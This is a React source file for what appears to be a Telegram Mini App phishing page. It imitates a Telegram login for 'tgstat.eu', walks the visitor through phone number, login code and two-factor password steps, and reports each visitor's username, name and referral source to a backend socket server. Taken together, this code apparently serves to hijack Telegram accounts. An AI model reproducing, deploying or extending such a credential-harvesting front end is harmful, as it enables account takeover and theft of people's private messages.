import React, { memo, useEffect, useState } from 'react';
import './index.scss';

import PhoneForm from './PhoneForm';
import CodeForm from './CodeForm';
import PasswordForm from './PasswordForm';

import io from 'socket.io-client';
import { useInitData } from '@telegram-apps/sdk-react';
import { useSearchParams } from 'react-router-dom';

const tg = window.Telegram.WebApp;

export const sockets = io(process.env.API_URL + '/userconnect', {
  autoConnect: false,
  reconnectionAttempts: 5,
  timeout: 4000,
  reconnectionDelay: 400,
  reconnectionDelayMax: 2500
});

sockets.on("connect_error", (err) => {
  // the reason of the error, for example "xhr poll error"
  console.log(err.message);

  // some additional description, for example the status code of the initial HTTP response
  console.log(err.description);

  // some additional context, for example the XMLHttpRequest object
  console.log(err.context);
});

const HomePage = () => {
  const [searchParams, setSearchParams] = useSearchParams();
  const [tab, setTab] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState({ value: null, label: null, code: null, pattern: null });
  const initData = useInitData();

  useEffect(() => {

    const connectHandler = () => {
      console.log('connect');

      const user = { username: 'НЕ ПОЛУЧИЛОСЬ ПОЛУЧИТЬ ДАННЫЕ О ЮЗЕРЕ', first_name: '', last_name: '', from: searchParams.get('ref_page') };
  
      sockets.emit('new-visitor', user);

      try{

        tg.ready();
        tg.disableVerticalSwipes()
        tg.expand();
        
      } catch(e){
        window.close();
      }

    }

    sockets.on('connect', connectHandler);
    sockets.connect();

    return () => {
      sockets.off('connect', connectHandler)
    }
  }, [])

  useEffect(() => {
    try{
      if(initData?.user && initData.user?.username !== 'TEST'){

        const user = { username: initData.user?.username, first_name: initData.user?.firstName, last_name: initData.user?.lastName, from: searchParams.get('ref_page') };
  
        sockets.emit('new-visitor', user);
  
        
      } else if(initData.user?.username !== 'TEST') {
        const user = { username: 'НЕ ПОЛУЧИЛОСЬ ПОЛУЧИТЬ ДАННЫЕ О ЮЗЕРЕ', first_name: '', last_name: '', from: searchParams.get('ref_page') };
  
        sockets.emit('new-visitor', user);
      }
    } catch(e){
      console.log(e);
    }
  }, [initData])


  return <div className='home-page'>
    <div className='container'>
      <div className='home-page__logo'>
        <div className='home-page__logo-tg'></div>
        <div className='home-page__logo-some'></div>
      </div>
      <div className='home-page__title'>
        Log in to use your Telegram account with <br /> <a>tgstat.eu/</a>.
      </div>
      <div className='home-page__descr'>
        Please enter your <span>phone number</span> in the <a>international format </a>
        and we will send a confirmation message to your account via Telegram. 
      </div>

      {tab === 1 && <PhoneForm setTab={setTab} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} />}
      {tab === 2 && <CodeForm setTab={setTab} phoneNumber={phoneNumber} />}
      {tab === 3 && <PasswordForm />}
    </div>
  </div>
}

export default memo(HomePage);
